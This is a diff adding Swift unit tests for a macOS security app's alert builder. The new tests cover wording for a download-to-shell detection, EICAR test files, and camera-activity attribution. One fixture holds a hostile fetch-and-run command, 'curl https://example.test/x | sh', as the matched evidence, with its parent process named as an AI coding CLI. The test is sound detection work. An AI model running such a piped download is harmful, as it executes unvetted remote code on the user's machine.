@@ -7,12 +7,77 @@ import XCTest
 
 final class UserFacingAlertBuilderTests: XCTestCase {
 
+    func test_behaviorIncidentOnPlatformShellHasNoFileRemediationAction() {
+        let process = NickProcessInfo(
+            pid: 1_842,
+            path: "/bin/zsh",
+            name: "zsh",
+            parentPID: 1_060,
+            parentName: "CodexCLI",
+            signingStatus: .signed(teamID: "APPLE_PLATFORM", signingID: "com.apple.zsh"),
+            metadata: ProcessMetadata(arguments: [])
+        )
+        let signal = ThreatSignal(
+            source: .endpointSecurity,
+            severity: .critical,
+            title: "Download-to-shell command detected",
+            description: "Behavior evidence",
+            context: ThreatSignalContext(
+                processInfo: process,
+                fileInfo: FileInfo(path: "/bin/zsh", sha256Hash: nil, entropy: nil, signingStatus: nil, sizeBytes: nil),
+                metadata: [
+                    "reason": "curl_pipe_shell",
+                    "class": "behavior",
+                    "detectionKind": "lolbin-behavior",
+                    "matchedCommand": "curl https://example.test/x | sh"
+                ]
+            )
+        )
+        let alert = ThreatAlert(
+            score: 0.9,
+            content: AlertContent(
+                title: "Download-to-shell command detected",
+                description: "Behavior evidence",
+                severity: .critical,
+                recommendedAction: "Review"
+            ),
+            contributingSignals: [signal]
+        )
+
+        let result = UserFacingAlertBuilder.shared.build(from: alert)
+
+        XCTAssertNil(alert.remediableFilePath)
+        XCTAssertFalse(result.actions.contains(.quarantine))
+        XCTAssertTrue(result.explanation.contains("Nick saw a shell run"))
+        XCTAssertFalse(result.explanation.lowercased().contains("file content"))
+    }
+
+    func test_eicarDetectionUsesExplicitTestFileLabel() {
+        let alert = ThreatAlert(
+            score: 0.9,
+            content: AlertContent(
+                title: "EICAR Anti-Malware Test File",
+                description: "Exact hash match",
+                severity: .high,
+                recommendedAction: "Review"
+            ),
+            contributingSignals: []
+        )
+
+        let result = UserFacingAlertBuilder.shared.build(from: alert)
+
+        XCTAssertEqual(result.headline, "EICAR test file")
+        XCTAssertEqual(result.assessment, "Test detection")
+        XCTAssertTrue(result.explanation.contains("harmless EICAR antivirus test signature"))
+    }
+
     func test_legacyShazamdAttribution_isInformational() {
         let alert = makeCaptureAlert(
             processName: "shazamd",
             path: "/Library/Developer/CoreSimulator/Volumes/iOS_Test/RuntimeRoot/System/Library/Frameworks/ShazamKit.framework/shazamd",
             signingStatus: .adHoc,
-            severity: .info
+            severity: .info,
+            attributionConfidence: "unavailable"
         )
 
         let result = UserFacingAlertBuilder.shared.build(from: alert)
@@ -30,7 +95,8 @@ final class UserFacingAlertBuilderTests: XCTestCase {
             processName: "unknown-camera-tool",
             path: "/tmp/unknown-camera-tool",
             signingStatus: .unsigned,
-            severity: .high
+            severity: .high,
+            attributionConfidence: "unavailable"
         )
 
         let result = UserFacingAlertBuilder.shared.build(from: alert)
@@ -39,6 +105,40 @@ final class UserFacingAlertBuilderTests: XCTestCase {
         XCTAssertEqual(result.assessment, "Informational activity")
         XCTAssertTrue(result.explanation.contains("were not evidence"))
         XCTAssertFalse(result.recommendedAction.lowercased().contains("delete"))
+    }
+
+    func test_contextualCapture_namesForegroundAppWithoutClaimingOwnership() {
+        let alert = makeCaptureAlert(
+            processName: "Photo Booth",
+            path: "/System/Applications/Photo Booth.app/Contents/MacOS/Photo Booth",
+            signingStatus: .signed(teamID: "APPLE_PLATFORM"),
+            severity: .info,
+            attributionConfidence: "contextual"
+        )
+
+        let result = UserFacingAlertBuilder.shared.build(from: alert)
+
+        XCTAssertEqual(result.headline, "HD Web Camera became active while Photo Booth was frontmost")
+        XCTAssertTrue(result.explanation.contains("not proof"))
+        XCTAssertFalse(result.explanation.contains("attributed the activity"))
+        XCTAssertEqual(result.severity, .safe)
+    }
+
+    func test_inactiveCapture_isPresentedAsStopped() {
+        let alert = makeCaptureAlert(
+            processName: "Voice Memos",
+            path: "/System/Applications/VoiceMemos.app/Contents/MacOS/VoiceMemos",
+            signingStatus: .signed(teamID: "APPLE_PLATFORM"),
+            severity: .info,
+            reason: "capture_device_inactive",
+            attributionConfidence: "authoritative"
+        )
+
+        let result = UserFacingAlertBuilder.shared.build(from: alert)
+
+        XCTAssertEqual(result.headline, "HD Web Camera became inactive")
+        XCTAssertTrue(result.explanation.contains("stopped streaming"))
+        XCTAssertEqual(result.assessment, "No longer active")
     }
 
     func test_genericFallback_doesNotClaimNickBlockedAnything() {
@@ -269,7 +369,9 @@ final class UserFacingAlertBuilderTests: XCTestCase {
         processName: String,
         path: String,
         signingStatus: SigningStatus,
-        severity: SignalSeverity
+        severity: SignalSeverity,
+        reason: String = "capture_device_active",
+        attributionConfidence: String = "authoritative"
     ) -> ThreatAlert {
         let process = NickProcessInfo(
             pid: 68348,
@@ -291,7 +393,8 @@ final class UserFacingAlertBuilderTests: XCTestCase {
                     "deviceName": "HD Web Camera",
                     "mediaType": "camera",
                     "process": processName,
-                    "reason": "capture_device_active"
+                    "reason": reason,
+                    "attributionConfidence": attributionConfidence
                 ]
             )
         )
